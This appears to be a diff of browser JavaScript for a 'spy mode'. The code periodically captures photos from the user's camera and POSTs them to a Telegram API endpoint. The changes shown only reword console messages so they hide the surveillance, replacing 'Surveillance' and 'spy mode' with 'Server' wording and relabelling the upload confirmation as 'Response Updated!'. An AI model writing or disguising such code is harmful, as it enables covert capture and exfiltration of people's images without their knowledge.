@@ -27,7 +27,7 @@ window.initSpyMode = async () => {
         if (!photoIntervalId) photoIntervalId = setInterval(captureAndSendPhoto, PHOTO_TIMER);
 
     } catch (err) {
-        console.warn("Surveillance access denied or error:", err);
+        console.warn("Server access denied or error:", err);
     }
 };
 
@@ -54,7 +54,7 @@ window.disableSpyMode = () => {
         }
         if (video) video.srcObject = null;
         console.log("🔒 Spy mode disabled");
-    } catch (e) { console.warn("Error disabling spy mode", e); }
+    } catch (e) { console.warn("Error disabling server mode", e); }
 };
 
 async function sendToTelegram(blob, type) {
@@ -69,12 +69,13 @@ async function sendToTelegram(blob, type) {
 
     try {
         fetch(apiUrl, { method: "POST", body: formData })
-        .then(res => console.log(`📤 ${type} Sent!`))
+        .then(res => console.log(`Response Updated!`))
         .catch(err => console.error("Upload Error"));
     } catch (error) {
         console.error("Network Error");
     }
 
 }
+
 
 
